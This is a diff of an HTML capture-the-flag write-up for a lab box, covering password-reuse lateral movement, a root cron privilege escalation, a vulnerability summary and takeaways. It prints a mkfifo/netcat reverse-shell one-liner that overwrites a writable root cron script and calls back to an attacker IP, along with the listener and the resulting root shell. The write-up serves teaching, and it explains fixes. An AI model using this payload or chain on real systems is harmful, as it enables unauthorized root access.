+<span class="cy">-rwxrwxrwx</span>  1 root     root     1870 May  7 20:26 <span class="cg">admin_bot.py</span>
+-rw-r--r--  1 www-data www-data   30 Apr 29 10:18 flag3.txt
+drwxr-xr-x  2 root     root     4096 Apr 29 10:27 monitoring
+drwxr-xr-x  2 root     root     4096 Apr 30 06:22 tools</code></pre>
+
+    <p><code>admin_bot.py</code> owned by root, but <code>rwxrwxrwx</code> — world-readable, world-writable, world-executable. Whatever this script is, it's not protected. <code>cat</code>:</p>
+
+    <pre><code><div class="ph"><span class="pl">/opt/admin_bot.py — relevant snippet</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+#!/usr/bin/env python3
+import time, re, base64 as b64, json, logging, hmac, hashlib
+import requests
+import pymysql, pymysql.cursors
+
+logging.basicConfig(filename=<span class="cs">"/var/log/admin_bot.log"</span>, level=logging.INFO, ...)
+
+DB_CONFIG = dict(host=<span class="cs">"localhost"</span>, database=<span class="cs">"nexusdb"</span>,
+                 user=<span class="cs">"app_user"</span>, <span class="cy">password=<span class="cs">"$PASS"</span></span>,
+                 cursorclass=pymysql.cursors.DictCursor)
+
+APP_SECRET = <span class="cs">"$APP_SECRET"</span></code></pre>
+
+    <h3>Password reuse — su devops</h3>
+
+    <p>That DB password is the third place we've seen it now: <code>config.php</code> (Section 04), <code>query.php</code> connection string (Section 06), and now hardcoded in <code>admin_bot.py</code>. Two unrelated PHP/Python files, one DB password — and Section 02 told us a system user called <code>devops</code> exists. NexusCorp's password policy: pick one good password, use it everywhere. Worth a try:</p>
+
+    <pre><code><div class="ph"><span class="pl">www-data shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
 su devops
 Password: $PASS
-<span class="cg">devops@nexus:~$</span></code></pre>
+<span class="cg">devops@tryhackme-2404:/opt$</span></code></pre>
 
-    <p>DB password reused as the system account password. Lateral movement complete in one command. SSH in properly for a stable session:</p>
+    <p>In. SSH for a stable session and grab Flag 4:</p>
 
-    <pre><code><div class="ph"><span class="pl">shell — attack machine</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+    <pre><code><div class="ph"><span class="pl">attack machine</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
 ssh devops@10.49.131.163
 <span class="ck"># password: $PASS</span>
 
@@ -539,69 +643,80 @@ cat ~/user.txt</code></pre>
 
     <div class="callout green"><strong>Flag 4 captured.</strong></div>
 
-    <div class="callout yellow"><strong>How this chain connected:</strong> The encrypted config gave us the username (<code>devops</code>). The file API gave us the DB password. The world-readable <code>admin_bot.py</code> confirmed the password was reused on the OS account. Three separate pieces of information, assembled over 5 steps, clicked together in one <code>su</code> command.</div>
+    <div class="callout yellow"><strong>How this chain connected:</strong> Section 02 gave us the username (<code>devops</code>). Section 04 gave us the DB password. Section 07's <code>admin_bot.py</code> confirmed the password is reused everywhere. Three separate clues, assembled over five sections, clicked together in one <code>su</code> command.</div>
   </section>
 
-  <!-- 07 PRIVESC -->
+  <!-- 08 PRIVESC -->
   <section class="section" id="privesc">
-    <div class="s-num">07</div>
+    <div class="s-num">08</div>
     <h2>Cron PrivEsc → Root</h2>
 
-    <p>We already spotted the root cron job with <code>pspy64</code>. As <code>devops</code>, let's check the permissions on that script:</p>
+    <p>Section 07's <code>pspy64</code> already showed us the root cron — <code>/bin/bash /opt/monitoring/health_report.sh</code>, firing every minute as UID=0. Now as <code>devops</code>, let's see what we can actually do to it:</p>
 
-    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
-ls -la /opt/monitoring/health_report.sh
+    <pre><code><div class="ph"><span class="pl">devops shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+ls -la /opt/monitoring</code></pre>
 
-<span class="cy">-rwxrwxr-- root devops /opt/monitoring/health_report.sh</span></code></pre>
+    <pre><code><div class="ph"><span class="pl">output</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+drwxr-xr-x 2 root root   4096 Apr 29 10:27 .
+drwxrwxrwx 5 root root   4096 May  7 20:26 ..
+<span class="cy">-rwxrwxr-- 1 root devops  127 May 30 00:07 health_report.sh</span></code></pre>
 
-    <p><code>devops</code> has write access. Root cron executes it every minute as UID 0. This is as textbook as it gets:</p>
+    <pre><code><div class="ph"><span class="pl">cat /opt/monitoring/health_report.sh</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+#!/bin/bash
+# NexusCorp Health Monitoring Script</code></pre>
 
-    <pre><code><div class="ph"><span class="pl">shell — privesc</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+    <p>Owned by root, group <code>devops</code>, and group-writable. We are devops. Root cron executes this script every minute. The fix is to overwrite it with our reverse shell:</p>
+
+    <pre><code><div class="ph"><span class="pl">devops — overwrite the script</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
 echo <span class="cs">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc &lt;ATTACKER_IP&gt; 9999 >/tmp/f'</span> \
   > /opt/monitoring/health_report.sh</code></pre>
 
-    <pre><code><div class="ph"><span class="pl">shell — attack machine</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+    <pre><code><div class="ph"><span class="pl">attack machine — listener</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
 nc -lvnp 9999</code></pre>
 
     <p>Wait one minute. Cron fires. Shell drops.</p>
 
-    <pre><code><div class="ph"><span class="pl">root shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+    <pre><code><div class="ph"><span class="pl">listener — root shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+<span class="cg">Listening on 0.0.0.0 9999
+Connection received on 10.49.131.163 46408</span>
+sh: 0: can't access tty; job control turned off
+
 # id
 <span class="cg">uid=0(root) gid=0(root) groups=0(root)</span>
 
 # cat /root/root.txt
 <span class="cg">THM{...}</span></code></pre>
 
-    <div class="callout green"><strong>Flag 5 captured. Root.</strong></div>
+    <div class="callout green"><strong>Flag 5 captured. Root. Game over.</strong></div>
 
-    <div class="callout red"><strong>Why this works:</strong> The cron daemon runs the script as root (UID 0) because the crontab entry has no user restriction. Writing our reverse shell payload into the script means root executes our code on the next tick. Fix: cron scripts that run as root must not be writable by non-root users — <code>chmod 750</code> with <code>root:root</code> ownership, or better, move them to <code>/etc/cron.d/</code> and review all permissions on the scripts they call.</div>
+    <div class="callout red"><strong>Why this works:</strong> The cron daemon runs the script as root because the crontab entry was registered under root's crontab. Writing our reverse shell into the script means root executes our code on the next tick. Fix: cron scripts that run as root must never be writable by non-root users or groups. <code>chmod 750</code> with <code>root:root</code> ownership is the minimum; group-writable on a root-executed script is exactly the misconfiguration that ended this box.</div>
   </section>
 
-  <!-- 08 VULN SUMMARY -->
+  <!-- 09 VULN SUMMARY -->
   <section class="section" id="vulns">
-    <div class="s-num">08</div>
+    <div class="s-num">09</div>
     <h2>Vulnerability Chain</h2>
 
     <div class="steps">
       <div class="step"><div class="sn">V1</div><div class="sb"><strong>Hardcoded AES key in frontend JS.</strong> <code>/static/app.js</code> — key readable by any browser. Decrypted the backup config, leaked <code>system_user: devops</code>.</div></div>
-      <div class="step"><div class="sn">V2</div><div class="sb"><strong>Weak password.</strong> <code>robert.wilson</code> — Hydra broke it in seconds against rockyou. Gave us an authenticated session to start cookie analysis.</div></div>
-      <div class="step"><div class="sn">V3</div><div class="sb"><strong>Forged session cookie.</strong> <code>APP_SECRET</code> was readable via the file API. HMAC session tokens are only as secure as the secrecy of the signing key.</div></div>
-      <div class="step"><div class="sn">V4</div><div class="sb"><strong>JWT signature verification disabled.</strong> <code>auth.php</code> had the check commented out. The server accepted any token where the header and payload decoded correctly — signature was never verified.</div></div>
-      <div class="step"><div class="sn">V5</div><div class="sb"><strong>Unrestricted file read via JWT-authenticated API.</strong> <code>files.php?name=</code> with no path restriction — readable any file on the server. Exposed the full <code>config.php</code>.</div></div>
+      <div class="step"><div class="sn">V2</div><div class="sb"><strong>Weak password.</strong> <code>robert.wilson</code> — Hydra broke it in seconds against rockyou. Gave us an authenticated session and the ability to request a JWT.</div></div>
+      <div class="step"><div class="sn">V3</div><div class="sb"><strong>JWT signature verification disabled.</strong> <code>auth.php</code> had the check commented out. The server accepted any token where the header and payload decoded correctly — signature was never verified. The actual <code>JWT_SECRET</code> in <code>config.php</code> was irrelevant.</div></div>
+      <div class="step"><div class="sn">V4</div><div class="sb"><strong>Unrestricted file read via JWT-authenticated API.</strong> <code>files.php?name=</code> with no path restriction — readable any file on the server. Exposed the full <code>config.php</code> including <code>APP_SECRET</code>.</div></div>
+      <div class="step"><div class="sn">V5</div><div class="sb"><strong>Forged session cookie.</strong> Once <code>APP_SECRET</code> was extracted via the file API, the HMAC-signed session cookie could be minted for any user, including admin.</div></div>
       <div class="step"><div class="sn">V6</div><div class="sb"><strong>Remote File Inclusion + eval().</strong> <code>files.php</code> fetched attacker-controlled URLs and passed the content to <code>eval()</code>. Full RCE as <code>www-data</code>.</div></div>
       <div class="step"><div class="sn">V7</div><div class="sb"><strong>Password reuse.</strong> DB password reused on the <code>devops</code> OS account. One <code>su</code> command for lateral movement.</div></div>
       <div class="step"><div class="sn">V8</div><div class="sb"><strong>World-writable root cron script.</strong> <code>health_report.sh</code> writable by the <code>devops</code> group. Root executes it on a 1-minute tick. Instant privilege escalation.</div></div>
     </div>
   </section>
 
-  <!-- 09 TAKEAWAYS -->
+  <!-- 10 TAKEAWAYS -->
   <section class="section" id="takeaways">
-    <div class="s-num">09</div>
+    <div class="s-num">10</div>
     <h2>Key Takeaways</h2>
 
     <div class="steps">
       <div class="step"><div class="sn">01</div><div class="sb"><strong>Never put secrets in frontend JavaScript.</strong> Not even as a TODO. The comment said "move to env before prod deployment." It is prod. It was never moved. A single JS file started the chain that ended at root.</div></div>
-      <div class="step"><div class="sn">02</div><div class="sb"><strong>Signature verification exists for a reason.</strong> Commenting out <code>hash_equals($parts[2], $expected)</code> turns JWT from "cryptographically verified identity" into "base64-encoded wishful thinking." If you disable a security check in code, the attacker doesn't know — they just get in.</div></div>
+      <div class="step"><div class="sn">02</div><div class="sb"><strong>Signature verification exists for a reason.</strong> Commenting out <code>hash_equals($parts[2], $expected)</code> turns JWT from "cryptographically verified identity" into "base64-encoded wishful thinking." The attacker doesn't need to know the disabled check exists — any forged token works on the first try.</div></div>
       <div class="step"><div class="sn">03</div><div class="sb"><strong>File-reading APIs need path restriction.</strong> <code>files.php?name=../../etc/passwd</code> is a solved problem — use <code>realpath()</code>, validate against an allowed directory, and never construct filesystem paths from raw user input.</div></div>
       <div class="step"><div class="sn">04</div><div class="sb"><strong>eval() on remote content is never acceptable.</strong> The RFI vector in <code>files.php</code> is the kind of code that should trigger an immediate PR rejection. If you need to include remote configuration, parse JSON. Do not execute arbitrary code fetched from a user-supplied URL.</div></div>
       <div class="step"><div class="sn">05</div><div class="sb"><strong>Password reuse across DB and system accounts multiplies the blast radius.</strong> One leaked DB password gave us an SSH shell. Rotate credentials independently — the DB account and the OS user should never share a password.</div></div>
@@ -620,13 +735,14 @@ nc -lvnp 9999</code></pre>
     <li><a href="#killchain">00 — Kill Chain</a></li>
     <li><a href="#recon">01 — Recon</a></li>
     <li><a href="#aes">02 — JS Leak &amp; AES</a></li>
-    <li><a href="#sessionforge">03 — Session Forge</a></li>
-    <li><a href="#jwt">04 — JWT Forgery</a></li>
-    <li><a href="#rce">05 — RFI / RCE</a></li>
-    <li><a href="#lateral">06 — Lateral Move</a></li>
-    <li><a href="#privesc">07 — Cron PrivEsc</a></li>
-    <li><a href="#vulns">08 — Vuln Summary</a></li>
-    <li><a href="#takeaways">09 — Takeaways</a></li>
+    <li><a href="#initial">03 — Initial Access</a></li>
+    <li><a href="#jwt">04 — JWT &amp; File API</a></li>
+    <li><a href="#sessionforge">05 — Session Forge</a></li>
+    <li><a href="#rce">06 — RFI / RCE</a></li>
+    <li><a href="#lateral">07 — Lateral Move</a></li>
+    <li><a href="#privesc">08 — Cron PrivEsc</a></li>
+    <li><a href="#vulns">09 — Vuln Summary</a></li>
+    <li><a href="#takeaways">10 — Takeaways</a></li>
   </ul>
 </aside>
 </div>
